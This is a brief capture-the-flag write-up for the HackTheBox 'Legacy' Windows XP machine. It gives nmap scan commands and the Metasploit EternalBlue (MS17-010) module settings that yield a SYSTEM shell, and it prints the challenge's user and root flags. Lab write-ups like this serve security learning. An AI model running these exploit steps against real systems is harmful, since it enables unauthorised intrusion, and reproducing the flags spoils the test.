---
title: "Easy Windows box vulnerable to MS17-010 EternalBlue"
date: 2024-01-01
categories: [HackTheBox]
tags: [HackTheBox, Easy, Windows]
description: "My writeup and solutions for various cybersecurity challenges."
---

Your writeup content here...

## Summary

Legacy is an easy Windows machine vulnerable to MS17-010 (EternalBlue). Simple exploitation path with no privilege escalation required.

## Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV -oA legacy 10.10.10.4
```

**Results:**
- Port 139/445 - SMB open
- Windows XP SP3

### SMB Enumeration
```bash
nmap --script smb-vuln* -p 139,445 10.10.10.4
```

Found vulnerable to MS17-010.

## Exploitation

### EternalBlue

Used Metasploit module:
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.4
set LHOST tun0
exploit
```

Got SYSTEM shell immediately.

## Flags

**User Flag:** `e69af0e4f443de7e36876fda4ec7644f`

**Root Flag:** `993442d258b0e0ec917cae9e695d5713`

## Key Takeaways

- Always check for known vulnerabilities
- MS17-010 is still common in older systems
- Proper patching is critical